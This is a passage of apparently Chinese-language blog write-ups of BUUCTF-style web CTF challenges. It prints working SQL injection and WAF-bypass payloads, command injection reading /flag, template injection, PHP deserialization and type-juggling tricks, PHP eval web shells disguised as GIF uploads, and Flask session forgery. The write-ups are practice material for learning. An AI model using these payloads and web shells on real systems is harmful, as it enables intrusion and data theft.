Archive_room.php。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103842.png)\n\n查看源码SECRET跳转的是action.php。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103907.png)\n\n但是跳转以后是url地址为end.php，所以中间跳过了一个页面，使用bp抓包查看。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104246.png)\n\nstristr()函数返回字符串中子串第一次出现位置之后的内容，简而言之还是过滤。\n\n同样使用php伪协议filter过滤器读取文件\n\n```\n?file=php://filter/convert.base64-encode/resource=flag.php\n```\n\n```\nPCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZmZjZTAwNWYtYjEyOS00YWM1LTg3MzYtZDM3YzUwYjYxNjZkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=\n```\n\n解密得到网页源码，flag在其中。\n\n-------------------\n\n# [极客大挑战 2019]LoveSQL\n\n顶端の告诫：用 sqlmap 是没有灵魂的\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104703.png)\n\n尝试万能密码（其实没卵用）\n\n```\n'or 1=1 #\n任意密码\n```\n\n这道题是常规的sql注入，测注入点、查字段数、爆库、爆字段值、爆表。组合拳\n\n字段数：\n\n```\n1' order by 3 #\n```\n\n爆库：\n\n```\n1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #\n\ngeekuser,l0ve1ysq1\n```\n\n爆字段值：\n\n```\n1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1' #\n\nid,username,password\n```\n\n爆表：\n\n```\n1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #\n\n'1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{c4e8849c-e0e3-4e0d-b701-26a5abeec46a}'\n```\n\n--------\n\n# 2021.01.21\n\n# [GXYCTF2019]Ping Ping Ping\n\n[传送门](https://braindance.tk/2020/%5BGXYCTF2019%5DPing%20Ping%20Ping/)\n\n--------\n\n# [ACTF2020 新生赛]Exec\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121090002.png)\n\n肯定是尝试管道符\n\n```\n127.0.0.1|cat /flag\n```\n\n------\n\n# [护网杯 2018]easy_tornado\n\n打开页面三个超链接\n\n> /flag.txt\n>\n> /welcome.txt\n>\n> hints.txt\n\n内容分别是\n\n> flag in /fllllllllllllag\n>\n> render\n>\n> md5(cookie_secret+md5(filename))\n\n进入hints.txt注意到url地址此时为\n\n```\n/file?filename=/hints.txt&filehash=2a84a09bc1d5e3d8745131754ff208fa\n```\n\n再根据hints.txt文件的内容，推断可以使用url方式访问文件，但是需要提供**filehash**值，加密的方法即hints.txt的内容：md5(cookie_secret+md5(filename))。flag文件的名称`filename`有了，接下来就是获取`cookie_secret`的值。\n\n接下来触及到盲区了，获取cookie_secret是看wp。\n\n> render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用\n\n> 在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量\n\n获取cookie_secret的payload\n\n```\n/error?msg={{handler.settings}}\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121091616.png)\n\n获得cookie_secret的值为\n\n```\neb326d39-cd67-47bd-b2d3-71125996417b\n```\n\n根据hints.txt的url验证一下是如何加密的。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092122.png)\n\n选中的蓝色部分是`/hints.txt`加密后的md5值。推断出filehash格式以后直接访问flag文件，payload：\n\n```\n/file?filename=/hints.txt&filehash=2a84a09bc1d5e3d8745131754ff208fa\n```\n\n-----\n\n# [极客大挑战 2019]Knife\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092431.png)\n\n一句话直接连。\n\n-----\n\n# [RoarCTF 2019]Easy Calc\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092956.png)\n\n一个计算器随便试一试，当输入字母时会报错。查看网页源码，在script中发现了运行计算器的php文件：**calc.php**，但是也有一句很重要的注释\n\n```\n<!--I've set up WAF to ensure security.-->\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121093233.png)\n\nphp的正则表达式中并没有过滤字母的条件，所以我们输入字母被过滤是因为**WAF**，接下来是参考网上的wp自己的理解\n\n可以在calc.php传参\n\n```\n? num=a\n```\n\nphp会输出一个值a，说明已经绕过了WAF。这里使用的是WAF和php解析方法不一样，WAF解析到空格' '会直接过滤掉，这样WAF认为传入的就是一个空值，并不会识别num，但是php解析的时候会把空格去掉，这样就能get到num的值。\n\n接下来绕过正则就可以使用char()的方式使用ascii码转。空格被过滤但是想使用php输出可以使用var_dump()\n\n查看根目录下文件，可以使用scandir（）遍历文件夹，其中char（47）------>   '/'  ：\n\n```\n? num=1;var_dump(scandir(chr(47)))\n```\n\n找到了疑似flag文件：f1agg，使用file_get_contents（）读取文件\n\n```\n?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))\n```\n\n-----\n\n# [极客大挑战 2019]Http\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png)\n\n查看源码在\"氛围\"这两个字上有隐藏的跳转Secret.php。进入以后页面显示\n\n```\nIt doesn't come from 'https://www.Sycsecret.com'\n```\n\n提示页面不是来自这个网址，所以在HackBar上加上Referer。之后又提示\n\n```\nPlease use \"Syclover\" browser\n```\n\n加上User-Agent。提示\n\n```\nNo!!! you can only read this locally!!!\n```\n\n加上X-Forwarded-For。[HTTP X-Forwarded-For 介绍](https://www.runoob.com/w3cnote/http-x-forwarded-for.html)\n\n最终的请求头：\n\n```\nGET /Secret.php HTTP/1.1\nHost: node3.buuoj.cn:26715\nUpgrade-Insecure-Requests: 1\nUser-Agent: Syclover\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nx-forwarded-for: 127.0.0.1\nreferer: https://www.Sycsecret.com\nConnection: close\n```\n\n-----\n\n# [极客大挑战 2019]PHP\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121105104.png)\n\n源码备份在`www.zip`中。下载以后有五个文件\n\n> class.php\n>\n> flag.php\n>\n> index.js\n>\n> index.php\n>\n> style.css\n\n在index.php中有一段代码\n\n```\n<?php\n    include 'class.php';\n    $select = $_GET['select'];\n    $res=unserialize(@$select);\n    ?>\n```\n\n再结合又一个class.php，所以这道题考点应该是反序列化。\n\nclass.php\n\n```\n<?php\ninclude 'flag.php';\n\n\nerror_reporting(0);\n\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n\n    function __wakeup(){\n        $this->username = 'guest';\n    }\n\n    function __destruct(){\n        if ($this->password != 100) {\n            echo \"</br>NO!!!hacker!!!</br>\";\n            echo \"You name is: \";\n            echo $this->username;echo \"</br>\";\n            echo \"You password is: \";\n            echo $this->password;echo \"</br>\";\n            die();\n        }\n        if ($this->username === 'admin') {\n            global $flag;\n            echo $flag;\n        }else{\n            echo \"</br>hello my friend~~</br>sorry i can't give you the flag!\";\n            die();\n\n            \n        }\n    }\n}\n?>\n```\n\n获取flag的代码位置是30-32行。分析这个Name对象，创建对象时可以为对象赋值，对象销毁时会判断password值是否是100，且username值是否为admin，如果两者都成立输出flag，但是__wakeup（）会在反序列化时调用将username值置为guest，所以需要反序列化逃逸。这里面有反序列化讲解[CVE-2016-7124漏洞复现](https://www.cnblogs.com/zy-king-karl/p/11436872.html)\n\n我使用的构造对象\n\n```\n<?php\nclass Name{\n    private $username ='admin';\n    private $password ='100';\n}\n\n$a = new Name;\necho serialize($a);\n\nO:4:\"Name\":2:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";s:3:\"100\";}\n```\n\n反序列化逃逸，使对象属性的数量大于原来的值，就可以绕过wakeup函数。最终payload\n\n```\n?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";s:3:\"100\";}\n```\n\n---\n\n# [极客大挑战 2019]Upload\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121111429.png)\n\n先尝试上传一个gif图片马内容为\n\n```\nGIF89a\n<?php\n@eval($_POST['a']);\n```\n\n页面提示过滤：\n\n>  NO! HACKER! your file included '<?'\n\n尝试script执行php代码\n\n```\n<script language=\"php\">eval($_POST['cmd'])</script>\n```\n\n可以上传，文件在/upload目录下。尝试修改后缀上传，phtml上传成功，可以执行php和script代码，使用蚁剑连接。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121112135.png)\n\n---\n\n# 2021.01.28\n\n# [极客大挑战 2019]BabySQL\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128113412.png)\n\n尝试万能密码，发现报错了：1=1#' and password='123'，也许是or被过滤了或者删掉了，尝试大小写无果，但是尝试双写通过了。需要注意的是爆表，爆数据库的语句中有**information**这个词，其中的**for**也会被过滤。其他过滤的词我遇到的有：union，select、from、where、and。\n\n爆数据库（填密码）：\n\n```\n1' uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() #\n```\n\n爆表：\n\n```\n1' uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name='b4bsql' #\n```\n\n爆字段值：\n\n```\n1' uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql #\n```\n\n---\n\n# [ACTF2020 新生赛]Upload\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128114257.png)\n\n指针放在灯泡上护显示上传文件的，图片马\n\n233.gif\n\n```\nGIF89a\n<?php\n@eval($_POST['a']);\n```\n\n尝试phtml是否被过滤，直接上传成功。蚁剑连接\n\n```\n------WebKitFormBoundaryUMSByAQmR2cduL6R\nContent-Disposition: form-data; name=\"upload_file\"; filename=\"233.phtml\"\nContent-Type: image/gif\n\nGIF89a\n<?php\n@eval($_POST['a']);\n------WebKitFormBoundaryUMSByAQmR2cduL6R\nContent-Disposition: form-data; name=\"submit\"\n\nupload\n------WebKitFormBoundaryUMSByAQmR2cduL6R--\n\n```\n\n---\n\n\n\n# [ACTF2020 新生赛]BackupFile\n\n```\nTry to find out source file!\n```\n\n题目提示备份文件，备份文件常见后缀：\n\n> .git .svn .swp .~ .bak .bash_history\n\n尝试index.php.bak，下载了一个备份文件：\n\n```\n<?php\ninclude_once \"flag.php\";\n\nif(isset($_GET['key'])) {\n    $key = $_GET['key'];\n    if(!is_numeric($key)) {\n        exit(\"Just num!\");\n    }\n    $key = intval($key);\n    $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\";\n    if($key == $str) {\n        echo $flag;\n    }\n}\nelse {\n    echo \"Try to find out source file!\";\n}\n```\n\n传一个必须为数字的参数key，使用intval（）函数处理，字符串相等则输出flag。这就想到了PHP中的`==`和`===`的区别。贴一段简单代码\n\n```\n<?php\n$str = 'abc';\nif(0==$str){\n\techo \"真\";\n}else{\n\techo \"假\";\n}\n```\n\n`==`在执行关系运算时，要求运算符两边的数据类型必须一致，所以等号右边的字符串被强制转换为了整型，若有一方为数字，另一方为字符串或空或null，均会先将非数字一方转化为0，再做比较。如果字符串是以数字开头的，就会截取直到遇到第一个字母。\n\n全等于`===`操作过程如下： \n\n1. 操作符两边的数据类型如果不相同，返回false 。\n2. 操作符两边的值如果不相同，返回false 。\n3. 最后将上面2步的操作进行与操作。返回与操作的结果。\n\n所以最终的payload：\n\n```\n?key=123\n```\n\n\n\n---\n\n# [HCTF 2018]admin\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202182820.png)\n\n可以在注释里找到\n\n> <!-- you are not admin -->\n\n思路应该是只要我们是admin登陆就可以得到flag，可以找到注册按钮，不能注册admin,那就随便注册一个进去看看。找到几个功能。\n\n* post。发表文章，但是没能找到在哪里打开\n* change password。改密码，尝试下能不能抓包改到admin的密码\n\n修改密码抓到的包：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202183647.png)\n\n感觉并没有什么下手的地方，唯一的就是session可能和身份有关。\n\n以下的是看网上的wp\n\n在change password页面查看源码，发现提供了题目的源码地址\n\n```html\n<!-- https://github.com/woadsl1234/hctf_flask/ -->\n```\n\n网站使用的是flask框架，具体路由表如下\n\n```python\n@app.route('/code')\t\t#二维码\ndef get_code():\n\n@app.route('/index')\t\t#首页\ndef index():\n\n@app.route('/register', methods = ['GET', 'POST'])\t\t#注册\ndef register():\n\n@app.route('/login', methods = ['GET', 'POST'])\t\t#登陆\ndef login():\n\n@app.route('/logout')\t\t#登出\ndef logout():\n\n@app.route('/change', methods = ['GET', 'POST'])\t\t#修改密码\ndef change():\n\n@app.route('/edit', methods = ['GET', 'POST'])\t\t#编辑信息\ndef edit():\n```\n\n## 解法一：flask session伪造\n\n这个解法和前面查看请求头时发现的session有关，flask框架是通过session来判断登录的用户身份，但是这个session是通过一些字符串拼接后加密的，所以如果我们可以知道字符串和加密算法，就可以实现伪造session。\n\n贴两篇相关文章：\n\n[Python Web之flask session&格式化字符串漏洞](https://xz.aliyun.com/t/3569)\n\n[客户端 session 导致的安全问题](https://www.leavesongs.com/PENETRATION/client-session-security.html#)\n\n首先需要注册一个账号登陆上去，看看请求头Cookie里的session值。\n\n说明一下flask的session值加密格式是：`SECRET_KEY` +`一个用户对象的字符串`(就像PHP里的序列化后)。`SECRET_KEY`的值我们可以在源码里找到：https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py中的第四行\n\n```\nSECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'\n```\n\n可以得知`SECRET_KEY`值为`ckj123`。然后在index.html页面发现只要session[‘name’] == 'admin’即可以得到flag。接下来就要使用到一个解密工具，需要解密出用户字符串的格式，再将用户名改为admin，加密后再去请求，我们就可以以admin的身份登陆了。\n\n如下 [**P师傅**](https://www.leavesongs.com/) 的程序解密：\n\n```python\n#!/usr/bin/env python3\nimport sys\nimport zlib\nfrom base64 import b64decode\nfrom flask.sessions import session_json_serializer\nfrom itsdangerous import base64_decode\n\ndef decryption(payload):\n    payload, sig = payload.rsplit(b'.', 1)\n    payload, timestamp = payload.rsplit(b'.', 1)\n\n    decompress = False\n    if payload.startswith(b'.'):\n        payload = payload[1:]\n        decompress = True\n\n    try:\n        payload = base64_decode(payload)\n    except Exception as e:\n        raise Exception('Could not base64 decode the payload because of '\n                         'an exception')\n\n    if decompress:\n        try:\n            payload = zlib.decompress(payload)\n        except Exception as e:\n            raise Exception('Could not zlib decompress the payload before '\n                             'decoding the payload')\n\n    return session_json_serializer.loads(payload)\n\nif __name__ == '__main__':\n    print(decryption(sys.argv[1].encode()))\n```\n\n执行命令\n\n```\npython run.py .eJw90MGKwkAMBuBXWXL2YLvuRfAgjBaFpFRGh8lFdK1tpxOFqmwd8d131gVvIX_4SPKA7bErLzWMr92tHMC2OcD4AR97GIPVOKIU-zzDgI4bDAeP2cZhWAcSO0SzcpiuhM26R1OMYi8h4faVSZGyniYYqk8y7FgdmlzFOV1LrufCat6gxpSikRu8WzMLrNqE1CJFXYzYRMmwZ-HahmXNGTkKi7sNbUpq6aP_xcpLrthbZyfwHMD3pTtur-e2PL1PyP_IUAWKS1uZ9Si2JzP3nLGg4NA6TMjYH9bexbonXXsuJi-ukV1VvqVi4xer6X9y2kkMoLqd97tTBQO4Xcru9TlIhvD8BSJwb7A.YELi9g.D_opOsSTFKn3wKeMF1rcGksx5HA\n```\n\n结果\n\n```\n{'_fresh': True, '_id': b'a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6', 'csrf_token': b'895783633ba12f15aedff2c4b355f0e9cb3158ee', 'image': b'AYHD', 'name': 'guobang', 'user_id': '10'}\n```\n\n然后我们需要吧`name`的值修改为`admin`。修改完成以后还需要回到原来的session格式，那么就需要用到一个加密flask的工具：[flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)\n\n> 这个工具也可以用来解密。我整理的使用方法如下，记得要用双引号`\"\"`括起来\n>\n> python flask_session_cookie_manager{2,3}.py {encode,decode}\n>\n> -s \"SECRET_KEY\"\t\t\t\t\t\t都需要使用\n> -c \"Session cookie value\"\t\t\t\tsession的值 \t 只有解密decode用得到\n> -t \"Session cookie structure\"  \t\tcookie结构    只有encode用得\n\n执行\n\n```\npython flask_session_cookie_manager3.py encode -s \"ckj123\" -t \"{'_fresh': True, '_id': b'a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6', 'csrf_token': b'895783633ba12f15aedff2c4b355f0e9cb3158ee', 'image': b'AYHD', 'name': 'admin', 'user_id': '10'}\"\n```\n\n得到\n\n```\n.eJw90MGKwkAMBuBXWXL2YLvdi-BBGC0KSamMDpOLuNtqO524UJWtI777zrrgLeQPH0nusDv09bmByaW_1iPYtRVM7vD2CROwGjNKcShyDOi4xVB5zLcOwyaQ2DGatcN0LWw2A5oyi72EhLtnJmXKepZgOL6TYceqagsV53QjhV4Iq0WLGlOKRmHwZs08sOoSUssUdZmxiZJhz8KNDauGc3IUljcbupTUykf_g5WXQrG3zk7hMYKvc3_YXb67-vQ6ofgjwzFQXNrKfECxA5mF55wFBcfWYULG_rD2LtYD6cZzOX1yreyP9Usqt365nv0np73EAPaVtCcYwfVc98-_QTKGxy8-U27W.YELpfA.vD1SVCAxOcwOPXc_DbwFqJT1TRg\n```\n\n放在请求头中，格式为\n\n```\ncookie: session=加密内容\n```\n\n\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210306103214.png)\n\n\n\n## 解法二：Unicode欺骗\n\n第二种方法是利用代码中的strlower()函数的使用不当。这个函数分别在注册、登陆、修改密码的地方出现三次。这个方法的思路就是unicode加密三层，在最后一层修改密码时执行函数strlower()后修改到admin的密码。过程为\n\n> ᴬᴰᴹᴵᴺ------注册后------>ADMIN---修改密码--->admin\n\npayload\n\n```\nᴬᴰᴹᴵᴺ\n```\n\n注册以后使用`ᴬᴰᴹᴵᴺ`登陆，然后修改密码时实际修改的就是admin的密码了，然后登陆admin即可。\n\n---\n\n# [极客大挑战 2019]BuyFlag\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png)网站题直接去看源码，在源码也搜索php有两个：index.php、pay.php。前者是首页，直接看后面的那个，打开就有提示\n\n> Only Cuit's students can buy the FLAG\n\n应该还是一道http的套娃题。查看网页的请求发现Cookie中有一个user=0，很可疑，改成user=1，有了下一个提示：输入密码，并且源码中有一段php\n\n```\n<!--\n\t~~~post money and password~~~\nif (isset($_POST['password'])) {\n\t$password = $_POST['password'];\n\tif (is_numeric($password)) {\n\t\techo \"password can't be number</br>\";\n\t}elseif ($password == 404) {\n\t\techo \"Password Right!</br>\";\n\t}\n}\n```\n\n还记得php`==`关系运算会强制转换类型，用POST传一个password=404a，`404a`会被强制转换为`404`，密码就对上了。接下来是钱的问题，flag需要**100000000**块钱我们也去要传过去。如果直接传入这么长的会提示字符串过长，所以我想到了科学计数法，`10e10`，就是10的10次方，通过。最终的请求：\n\n```\nPOST /pay.php HTTP/1.1\nHost: 268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn\nContent-Length: 25\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn/pay.php\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: user=1\nConnection: close\n\npassword=404a&money=10e10\n```\n\n---\n\n# [SUCTF 2019]CheckIn\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201103750.png)\n\n知识点\n\n> .user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。可谓很广，不像.htaccess有局限性，只能是apache.\n\n准备好.user.ini文件内容为自动包含图片马，因为上传会检查文件头，所以添加了一个GIF文件头伪装：\n\n```\nGIF89a\nauto_prepend_file=233.gif\n```\n\n接下来上传图片马，尝试了正常上传PHP马会提示：\n\n> <? in contents!\n\n所以使用script马执行php：\n\n```\nGIF89a\n<script language=\"php\">eval($_REQUEST[shell])</script>\n```\n\n上传成功后会提示文件路径：\n\n> Your dir uploads/852aff287f54bca0ed7757a702913e50\n> Your files :\n> array(5) { [0]=> string(1) \".\" [1]=> string(2) \"..\" [2]=> string(9) \".user.ini\" [3]=> string(7) \"233.gif\" [4]=> string(9) \"index.php\" }\n\n这时候.user.ini文件已经会帮我们自动包含图片马了，所以我们只需要访问一个PHP文件即可，正好上传目录下有一个index.php文件，可以直接蚁剑连接或者POST请求system('cat /flag')。\n\n---\n\n# [BJDCTF2020]Easy MD5\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201105021.png)\n\n参考：\n\n> [【Jarvis OJ】Login--password='\".md5($pass,true).\"]('https://www.jianshu.com/p/12125291f50d)\n>\n> [sql注入：md5($password,true)](https://blog.csdn.net/March97/article/details/81222922)\n>\n> [Leet More 2010 Oh Those Admins! writeup](http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/)\n\n随便输入一些东西都没有反应，在请求头中发现了一个Hint：\n\n> select * from 'admin' where password=md5($pass,true)\n\n**语法**\n\n**md5(string,raw)**\n\n| 参数   | 描述                                                         |\n| ------ | ------------------------------------------------------------ |\n| string | 必需。要计算的字符串。                                       |\n| raw    | 可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串 |\n\n概括理解，这里如果raw参数为`true`的话，这个函数的返回值是`string`的md5加密值进行十六进制解码的字符串。这道题我当时是直接看了源码跳过了第一层，第一层的答案其实是`ffifdyop`，我们来对它进行一波操作\n\n* 源字符串：ffifdyop\n\n* md5加密值：276f722736c95d99e921722cf9ed621c\n\n* hex解码：'or'6É].é!r,ùíb.\n\n最后那几个应该是不可见字符，重要的是前面一段：`'or'6`，这里还要说明一下，这提示应该不算严谨，真正的sql语句应该是在md5函数前后各一个`'`单引号。执行以后真正的sql语句为\n\n```\nselect * from 'admin' where password=''or'6É].é!r,ùíb.‘\n```\n\n可以看到原理是构成一个闭合，这里还有第二个知识点，是or后面的字符串被认为是true，引用文章里的一段：\n\n> a string starting with a `1` is cast as an integer when used as a boolean.\n>\n> 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。\n\n自己进行的测试：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113825.png)\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113839.png)\n\n所以真正的解法是只要sql语句的格式为password='xxxxxxxx' or '1xxxx'，即hex包含字符串\"276f722731\"（'or'1），其实or后面开头只要是数字即可，1-9的hex范围为31-39。\n\n下面这个程序是这道题开头参考列表中的第三个链接。\n\n```\n<?php \nfor ($i = 0;;) { \n for ($c = 0; $c < 1000000; $c++, $i++)\n  if (stripos(md5($i, true), '\\'or\\'') !== false)\n   echo \"\\nmd5($i) = \" . md5($i, true) . \"\\n\";\n echo \".\";\n}\n?>\n```\n\n这个程序遍历数字进行md5加密，使用stripos匹配是否有`'or'`，这个函数有一个弊病就是如果是以`'or'`开头的不会匹配到，并且我们需要的是or后面以数字开头都可以，所以需要稍微做一些修改，使用正则表达式由`\\'or\\'`改为`'or'([1-9]+|0+[1-9])`<span class=\"heimu\"> 不过我的方法自己还没跑出来🤣，回头加个多线程试一试</span>\n\n（更新）\n\n自己写了一个python程序，放在学生服务器上跑了一个下午加一个晚上，出了两个答案，好家伙从1跑到52亿：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210203094304.png)\n\n```\n 找到了md5(2413633098): \n 找到了md5(5207660362): \n 找到了md5(8351555222): \n 找到了md5(13095770027): \n 找到了md5(14860117901): \n 找到了md5(15724086109): \n 找到了md5(16529176061): \n 找到了md5(17428338265): \n 找到了md5(18717303578):\n 找到了md5(19342380396): \n 找到了md5(23960028257): \n 找到了md5(32561902614): \n 找到了md5(38983153698): \n 找到了md5(39742292223): \n 找到了md5(44120894060): \n 找到了md5(44820604888): \n 找到了md5(45570673322): \n 找到了md5(45855250502): \n 找到了md5(53660569009): \n 找到了md5(55098175010): \n 找到了md5(59763304323): \n 找到了md5(60185044906): \n 找到了md5(68625783421): \n 找到了md5(70949326264): \n (md5值删了，因为乱码会影响博客的搜索功能)\n```\n\n程序源码如下（自己写着玩，轻喷）：\n\n```\n# codeing = utf-8\n\nimport threading\nimport hashlib\nimport re\nimport itertools\nimport time\n# r'\\'or\\'([1-9]+|0+[1-9])'\n# r'\\'or\\''\npattern=re.compile(r'\\'or\\'([1-9]+|0+[1-9])',re.I)\nitem = itertools.count(1)\n\ndef thrfunc():\n    while 1:\n        s2 = ''\n        temp = str(next(item))\n        s1 = hashlib.md5(temp.encode(encoding='UTF-8')).hexdigest()\n        for i in range(0, len(s1), 2):\n            s2 = s2 + chr(int(s1[i:i + 2], 16))\n        if re.search(pattern, s2):\n            print(\"找到了md5(\" + temp + \"): \" + s2)\n\n\nthreads=[]\nfor i in range(10):\n    t = threading.Thread(target=thrfunc)\n    threads.append(t)\n    t.start()\n\n```\n\n虽然不知道多整几个能用的值可以干什么，但是觉得自己写的程序跑出来答案就很爽🤣。\n\n还有一个能用的md5值：\n\n```\ncontent: 129581926211651571912466741651878684928\nhex: 06da5430449f8f6f23dfc1276f722738\nraw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1'or'8\nstring: T0Do#'or'8\n```\n\n以上是第一层。**其实看了源码里只验证了字符串是否等于`ffifdyop`我写的脚本里的值肯定通过不了**\n\n第二层可以直接在源码中看到注释。\n\n```\n$a = $GET['a'];\n$b = $_GET['b'];\n\nif($a != $b && md5($a) == md5($b)){\n    // wow, glzjin wants a girl friend.\n```\n\n简单的md5以0E开头\n\n```\na=QNKCDZO&b=240610708\n```\n\n第三层\n\n```\n<?php\nerror_reporting(0);\ninclude \"flag.php\";\n\nhighlight_file(__FILE__);\n\nif($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){\n    echo 